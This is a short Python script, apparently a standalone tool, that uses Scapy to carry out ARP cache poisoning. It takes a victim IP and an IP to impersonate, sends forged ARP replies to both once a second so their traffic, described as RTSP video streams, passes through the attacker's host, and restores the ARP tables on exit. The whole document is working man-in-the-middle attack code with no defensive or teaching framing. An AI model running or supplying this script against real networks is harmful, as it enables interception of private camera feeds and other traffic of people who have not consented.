# Scapy ARP poisoning to intercept RTSP packets

from scapy.all import ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, send
import time
import sys


def poison(target_ip, target_mac, source_ip):
    packet = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac)
    send(packet)


def antidote(target_ip, target_mac, source_ip, source_mac):
    packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac,
                 pdst=target_ip, hwdst=target_mac)
    send(packet)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Incorrect number of arguments!")
        exit(1)

    victim_ip = sys.argv[1]
    victim_mac = getmacbyip(victim_ip)

    spoof_ip = sys.argv[2]
    spoof_mac = getmacbyip(spoof_ip)

    attacker_iface = conf.iface
    attacker_ip = get_if_addr(attacker_iface)
    attacker_mac = get_if_hwaddr(attacker_iface)

    try:
        while True:
            poison(spoof_ip, spoof_mac, victim_ip)
            poison(victim_ip, victim_mac, spoof_ip)
            time.sleep(1)
    except:
        antidote(victim_ip, victim_mac, spoof_ip, spoof_mac)
        antidote(spoof_ip, spoof_mac, victim_ip, victim_mac)
